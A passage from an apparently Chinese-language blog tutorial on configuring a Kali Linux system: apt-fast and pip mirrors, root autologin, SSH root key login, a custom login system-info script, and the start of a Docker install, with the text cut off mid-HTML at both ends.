signed-by=/etc/apt/trusted.gpg.d/apt-fast.gpg] http://ppa.launchpad.net/apt-fast/stable/ubuntu bionic main</span></span><br></pre></td></tr></table></figure><h3 id="添加签名">添加签名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt install -y gnupg2</span><br><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys A2166B8DE8BDC3367D1901C11EE2FF37CA8DA16B</span><br><span class="line">apt-key <span class="built_in">export</span> CA8DA16B|sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/apt-fast.gpg</span><br><span class="line"><span class="built_in">mv</span> /etc/apt/trusted.gpg.d/apt-fast.gpg~ /etc/apt/trusted.gpg.d/apt-fast.gpg</span><br><span class="line"><span class="built_in">ls</span> /etc/apt/trusted.gpg.d/</span><br><span class="line"><span class="comment"># 如果后缀有问题就重命名</span></span><br><span class="line">apt-key del CA8DA16B</span><br><span class="line">apt update</span><br><span class="line">apt install apt-fast</span><br></pre></td></tr></table></figure><p>依次选择 apt — 16 — 是</p><p>修改apt-fast设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt-fast.conf</span><br><span class="line"><span class="comment">#添加以下配置</span></span><br><span class="line"></span><br><span class="line">MIRRORS=( <span class="string">&#x27;https://mirrors.huaweicloud.com/kali,https://mirrors.ustc.edu.cn/kali,https://mirrors.aliyun.com/kali,https://mirrors.tuna.tsinghua.edu.cn/kali,https://http.kali.org/kali&#x27;</span> )</span><br></pre></td></tr></table></figure><h2 id="更改apt-fast为af">更改apt-fast为af</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.zshrc</span><br><span class="line"><span class="comment">#添加如下</span></span><br><span class="line"><span class="built_in">alias</span> af=<span class="string">&#x27;sudo apt-fast&#x27;</span></span><br><span class="line"><span class="comment">#更新.zshrc文件</span></span><br><span class="line"><span class="built_in">source</span> .zshrc</span><br></pre></td></tr></table></figure><p>更新系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">af update</span><br><span class="line">af upgrade</span><br></pre></td></tr></table></figure><h2 id="安装python3-pip">安装python3-pip</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">af install python3-pip</span><br><span class="line">sudo <span class="built_in">mkdir</span> ~/.pip</span><br><span class="line">sudo vim ~/.pip/pip.conf</span><br><span class="line"><span class="comment">#添加如下内容</span></span><br><span class="line">[global]</span><br><span class="line">index-url = https://mirrors.huaweicloud.com/repository/pypi/simple</span><br><span class="line">trusted-host = mirrors.huaweicloud.com</span><br><span class="line"><span class="built_in">timeout</span> = 120</span><br></pre></td></tr></table></figure><h2 id="root账户自动登录">root账户自动登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/lightdm/lightdm.conf</span><br><span class="line"></span><br><span class="line">autologin-user=root</span><br><span class="line">autologin-user-timeout=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim /etc/pam.d/lightdm-autologin</span><br><span class="line"></span><br><span class="line">注释下面这段</span><br><span class="line">auth required pam_succeed_if.so user != root quiet_success</span><br></pre></td></tr></table></figure><h2 id="开启ssh-root账户密钥登录">开启ssh root账户密钥登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 修改ssh配置</span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">RSAAuthentication <span class="built_in">yes</span></span><br><span class="line">PubkeyAuthentication <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">// 添加公钥 id_rsa.pub 自备</span><br><span class="line"><span class="built_in">mkdir</span> ~/.ssh</span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 700 ~/.ssh</span><br><span class="line">// 设置开机自启</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">update-rc.d ssh <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><h2 id="配置欢迎信息">配置欢迎信息</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">目前显示的信息</span><br><span class="line">Linux kali 5.18.0-kali7-amd64 <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1kali1 (2022-08-31) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Oct  9 17:04:06 2022 from 10.0.0.1</span><br><span class="line">┏━(Message from Kali developers)</span><br><span class="line">┃</span><br><span class="line">┃ This is a minimal installation of Kali Linux, you likely</span><br><span class="line">┃ want to install supplementary tools. Learn how:</span><br><span class="line">┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/</span><br><span class="line">┃</span><br><span class="line">┗━(Run: “<span class="built_in">touch</span> ~/.hushlogin” to hide this message)</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">cat</span> /etc/issue</span><br><span class="line">Kali GNU/Linux Rolling \n \l</span><br><span class="line"></span><br><span class="line">删除issue里的信息</span><br><span class="line">无变化,是因为我是远程登录的</span><br><span class="line">/etc/issue 本地登陆显示的信息，本地登录前</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">cat</span> /etc/issue.net</span><br><span class="line">Kali GNU/Linux Rolling</span><br><span class="line">网络登陆显示的信息，登录后显示，需要由sshd配置</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">cat</span> /etc/motd</span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /etc/profile.d/</span><br><span class="line">查看这里的文件</span><br><span class="line">❯ <span class="built_in">ls</span> /etc/profile.d/</span><br><span class="line">kali.sh  sysinfo.sh</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">发现还有信息</span><br><span class="line">Linux kali 5.18.0-kali7-amd64 <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1kali1 (2022-08-31) x86_64</span></span><br><span class="line">Last login: Sun Oct  9 17:32:27 2022 from 10.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">接着查找</span><br><span class="line">grep -nr <span class="string">&quot;Linux kali 5.18.0-kali7-amd64&quot;</span> /</span><br><span class="line"></span><br><span class="line">发现 此文件</span><br><span class="line">/run/motd.dynamic</span><br><span class="line">❯ <span class="built_in">cat</span> /run/motd.dynamic</span><br><span class="line">Linux kali 5.18.0-kali7-amd64 <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1kali1 (2022-08-31) x86_64</span></span><br><span class="line"></span><br><span class="line">发现删除后会重新生成</span><br><span class="line">于是尝试查找</span><br><span class="line">❯ find / -name <span class="string">&quot;*motd*&quot;</span></span><br><span class="line">/usr/lib/python3/dist-packages/samba/__pycache__/vgp_motd_ext.cpython-310.pyc</span><br><span class="line">/usr/lib/python3/dist-packages/samba/vgp_motd_ext.py</span><br><span class="line">/usr/lib/x86_64-linux-gnu/security/pam_motd.so</span><br><span class="line">/usr/share/man/man8/pam_motd.8.gz</span><br><span class="line">/usr/share/man/man5/motd.5.gz</span><br><span class="line">/usr/share/base-files/motd</span><br><span class="line">/run/motd.dynamic</span><br><span class="line">/etc/motd</span><br><span class="line">/etc/update-motd.d</span><br><span class="line"></span><br><span class="line">发现可以文件夹/etc/update-motd.d</span><br><span class="line"></span><br><span class="line">❯ <span class="built_in">cat</span> /etc/update-motd.d/10-<span class="built_in">uname</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">uname</span> -snrvm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">❯ <span class="built_in">uname</span> -snrvm</span><br><span class="line">Linux kali 5.18.0-kali7-amd64 <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1kali1 (2022-08-31) x86_64</span></span><br><span class="line"></span><br><span class="line">确认就是此文件</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">关闭last login信息</span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">去掉注释</span><br><span class="line">改为</span><br><span class="line">PrintLastLog no</span><br><span class="line">重启ssh服务,这时就不会显示任何信息</span><br></pre></td></tr></table></figure><h3 id="配置显示系统信息">配置显示系统信息</h3><p>在/etc/profile.d/目录下新建sysinfo.sh文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="built_in">export</span> LANG=zh_CN.UTF-8</span><br><span class="line"></span><br><span class="line">THIS_SCRIPT=<span class="string">&quot;sysinfo&quot;</span></span><br><span class="line">MOTD_DISABLE=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">SHOW_IP_PATTERN=<span class="string">&quot;^[ewr].*|^br.*|^lt.*|^umts.*&quot;</span></span><br><span class="line"></span><br><span class="line">DATA_STORAGE=/userdisk/data</span><br><span class="line">MEDIA_STORAGE=/userdisk/snail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># don&#x27;t edit below here</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">display</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment"># $1=name $2=value $3=red_limit $4=minimal_show_limit $5=unit $6=after $7=acs/desc&#123;</span></span><br><span class="line">        <span class="comment"># battery red color is opposite, lower number</span></span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> == <span class="string">&quot;Battery&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">local</span> great=<span class="string">&quot;&lt;&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">local</span> great=<span class="string">&quot;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &gt; <span class="string">&quot;0&quot;</span> &amp;&amp; (( &quot;<span class="variable">$&#123;2%.*&#125;</span>&quot; -ge &quot;<span class="variable">$4</span>&quot; )) ]]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;%-14s%s&quot;</span> <span class="string">&quot;<span class="variable">$1</span>:&quot;</span></span><br><span class="line">                <span class="keyword">if</span> awk <span class="string">&quot;BEGIN&#123;exit ! (<span class="variable">$2</span> <span class="variable">$great</span> <span class="variable">$3</span>)&#125;&quot;</span>; <span class="keyword">then</span></span><br><span class="line">                        <span class="built_in">echo</span> -ne <span class="string">&quot;\e[0;91m <span class="variable">$2</span>&quot;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                        <span class="built_in">echo</span> -ne <span class="string">&quot;\e[0;92m <span class="variable">$2</span>&quot;</span>;</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;%-1s%s\x1B[0m&quot;</span> <span class="string">&quot;<span class="variable">$5</span>&quot;</span></span><br><span class="line">                <span class="built_in">printf</span> <span class="string">&quot;%-11s%s\t&quot;</span> <span class="string">&quot;<span class="variable">$6</span>&quot;</span></span><br><span class="line">                <span class="built_in">return</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">&#125; <span class="comment"># display</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_ip_addresses</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">local</span> ips=()</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> /sys/class/net/*; <span class="keyword">do</span></span><br><span class="line">                <span class="built_in">local</span> intf=$(<span class="built_in">basename</span> <span class="variable">$f</span>)</span><br><span class="line">                <span class="comment"># match only interface names starting with e (Ethernet), br (bridge), w (wireless), r (some Ralink drivers use ra&lt;number&gt; format)</span></span><br><span class="line">                <span class="keyword">if</span> [[ <span class="variable">$intf</span> =~ <span class="variable">$SHOW_IP_PATTERN</span> ]]; <span class="keyword">then</span></span><br><span class="line">                        <span class="built_in">local</span> tmp=$(ip -4 addr show dev <span class="variable">$intf</span> | awk <span class="string">&#x27;/inet/ &#123;print $2&#125;&#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;/&#x27;</span> -f1)</span><br><span class="line">                        <span class="comment"># add both name and IP - can be informative but becomes ugly with long persistent/predictable device names</span></span><br><span class="line">                        <span class="comment">#[[ -n $tmp ]] &amp;&amp; ips+=(&quot;$intf: $tmp&quot;)</span></span><br><span class="line">                        <span class="comment"># add IP only</span></span><br><span class="line">                        [[ -n <span class="variable">$tmp</span> ]] &amp;&amp; ips+=(<span class="string">&quot;<span class="variable">$tmp</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;ips[@]&#125;</span>&quot;</span></span><br><span class="line">&#125; <span class="comment"># get_ip_addresses</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">storage_info</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment"># storage info</span></span><br><span class="line">        RootInfo=$(<span class="built_in">df</span> -h /)</span><br><span class="line">        root_usage=$(awk <span class="string">&#x27;/\// &#123;print $(NF-1)&#125;&#x27;</span> &lt;&lt;&lt;<span class="variable">$&#123;RootInfo&#125;</span> | sed <span class="string">&#x27;s/%//g&#x27;</span>)</span><br><span class="line">        root_total=$(awk <span class="string">&#x27;/\// &#123;print $(NF-4)&#125;&#x27;</span> &lt;&lt;&lt;<span class="variable">$&#123;RootInfo&#125;</span>)</span><br><span class="line">&#125; <span class="comment"># storage_info</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># query various systems and send some stuff to the background for overall faster execution.</span></span><br><span class="line"><span class="comment"># Works only with ambienttemp and batteryinfo since A20 is slow enough :)</span></span><br><span class="line">storage_info</span><br><span class="line">critical_load=$(( <span class="number">1</span> + $(grep -c processor /proc/cpuinfo) / <span class="number">2</span> ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get uptime, logged in users and load in one take</span></span><br><span class="line">UptimeString=$(<span class="built_in">uptime</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">time=$(awk -F<span class="string">&quot; &quot;</span> <span class="string">&#x27;&#123;print $3&quot; &quot;$4&#125;&#x27;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;UptimeString&#125;</span>&quot;</span>)</span><br><span class="line">load=<span class="string">&quot;<span class="subst">$(awk -F<span class="string">&quot;average: &quot;</span> &#x27;&#123;print $2&#125;&#x27;&lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;UptimeString&#125;</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$&#123;time&#125;</span> <span class="keyword">in</span></span><br><span class="line">        1:*) <span class="comment"># 1-2 hours</span></span><br><span class="line">                time=$(awk -F<span class="string">&quot; &quot;</span> <span class="string">&#x27;&#123;print $3&quot; 小时&quot;&#125;&#x27;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;UptimeString&#125;</span>&quot;</span>)</span><br><span class="line">                ;;</span><br><span class="line">        *:*) <span class="comment"># 2-24 hours</span></span><br><span class="line">                time=$(awk -F<span class="string">&quot; &quot;</span> <span class="string">&#x27;&#123;print $3&quot; 小时&quot;&#125;&#x27;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;UptimeString&#125;</span>&quot;</span>)</span><br><span class="line">                ;;</span><br><span class="line">        *day) <span class="comment"># days</span></span><br><span class="line">                days=$(awk -F<span class="string">&quot; &quot;</span> <span class="string">&#x27;&#123;print $3&quot;天&quot;&#125;&#x27;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;UptimeString&#125;</span>&quot;</span>)</span><br><span class="line">                time=$(awk -F<span class="string">&quot; &quot;</span> <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;UptimeString&#125;</span>&quot;</span>)</span><br><span class="line">                time=<span class="string">&quot;<span class="variable">$days</span> &quot;</span>$(awk -F<span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1&quot;小时 &quot;$2&quot;分钟&quot;&#125;&#x27;</span> &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$&#123;time&#125;</span>&quot;</span>)</span><br><span class="line">                ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># memory and swap</span></span><br><span class="line">mem_info=$(LC_ALL=C free -w 2&gt;/dev/null | grep <span class="string">&quot;^Mem&quot;</span> || LC_ALL=C free | grep <span class="string">&quot;^Mem&quot;</span>)</span><br><span class="line">memory_usage=$(awk <span class="string">&#x27;&#123;printf(&quot;%.0f&quot;,(($2-($4+$6))/$2) * 100)&#125;&#x27;</span> &lt;&lt;&lt;<span class="variable">$&#123;mem_info&#125;</span>)</span><br><span class="line">memory_total=$(awk <span class="string">&#x27;&#123;printf(&quot;%d&quot;,$2/1024)&#125;&#x27;</span> &lt;&lt;&lt;<span class="variable">$&#123;mem_info&#125;</span>)</span><br><span class="line">swap_info=$(LC_ALL=C free -m | grep <span class="string">&quot;^Swap&quot;</span>)</span><br><span class="line">swap_usage=$( (awk <span class="string">&#x27;/Swap/ &#123; printf(&quot;%3.0f&quot;, $3/$2*100) &#125;&#x27;</span> &lt;&lt;&lt;<span class="variable">$&#123;swap_info&#125;</span> 2&gt;/dev/null || <span class="built_in">echo</span> 0) | <span class="built_in">tr</span> -c -d <span class="string">&#x27;[:digit:]&#x27;</span>)</span><br><span class="line">swap_total=$(awk <span class="string">&#x27;&#123;print $(2)&#125;&#x27;</span> &lt;&lt;&lt;<span class="variable">$&#123;swap_info&#125;</span>)</span><br><span class="line"></span><br><span class="line">c=0</span><br><span class="line"><span class="keyword">while</span> [ ! -n <span class="string">&quot;<span class="subst">$(get_ip_addresses)</span>&quot;</span> ];<span class="keyword">do</span></span><br><span class="line">[ <span class="variable">$c</span> -eq 3 ] &amp;&amp; <span class="built_in">break</span> || <span class="built_in">let</span> c++</span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">ip_address=<span class="string">&quot;<span class="subst">$(get_ip_addresses)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display info</span></span><br><span class="line">display <span class="string">&quot;系统负载&quot;</span> <span class="string">&quot;<span class="variable">$&#123;load%% *&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;critical_load&#125;</span>&quot;</span> <span class="string">&quot;0&quot;</span> <span class="string">&quot;&quot;</span> <span class="string">&quot;<span class="variable">$&#123;load#* &#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;运行时间:  \x1B[92m%s\x1B[0m\t\t&quot;</span> <span class="string">&quot;<span class="variable">$time</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> <span class="comment"># fixed newline</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">display <span class="string">&quot;内存已用&quot;</span> <span class="string">&quot;<span class="variable">$memory_usage</span>&quot;</span> <span class="string">&quot;70&quot;</span> <span class="string">&quot;0&quot;</span> <span class="string">&quot; %&quot;</span> <span class="string">&quot; of <span class="variable">$&#123;memory_total&#125;</span>MB&quot;</span></span><br><span class="line">display <span class="string">&quot;交换内存&quot;</span> <span class="string">&quot;<span class="variable">$swap_usage</span>&quot;</span> <span class="string">&quot;10&quot;</span> <span class="string">&quot;0&quot;</span> <span class="string">&quot; %&quot;</span> <span class="string">&quot; of <span class="variable">$swap_total</span>&quot;</span><span class="string">&quot;Mb&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;IP  地址:  \x1B[92m%s\x1B[0m&quot;</span> <span class="string">&quot;<span class="variable">$ip_address</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> <span class="comment"># fixed newline</span></span><br><span class="line"></span><br><span class="line">display <span class="string">&quot;系统存储&quot;</span> <span class="string">&quot;<span class="variable">$root_usage</span>&quot;</span> <span class="string">&quot;90&quot;</span> <span class="string">&quot;1&quot;</span> <span class="string">&quot;%&quot;</span> <span class="string">&quot; of <span class="variable">$root_total</span>&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;CPU 信息:  \x1B[92m%s\x1B[0m\t&quot;</span> <span class="string">&quot;<span class="subst">$(echo `cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c`)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="安装docker-ce">安装docker-ce</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">af install apt-transport-https ca-certificates curl gnupg2 software-properties-common</span><br><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository <span class="string">&quot;deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian buster stable&quot;</span></span><br><span class="line">af update</span><br><span class="line">af install -y docker-ce</span><br><span class="line">service docker start</span><br><span class="line">update-rc.d docker <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 设置镜像加速</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;registry-mirrors&quot;</span>:[</span><br><span class="line"><span 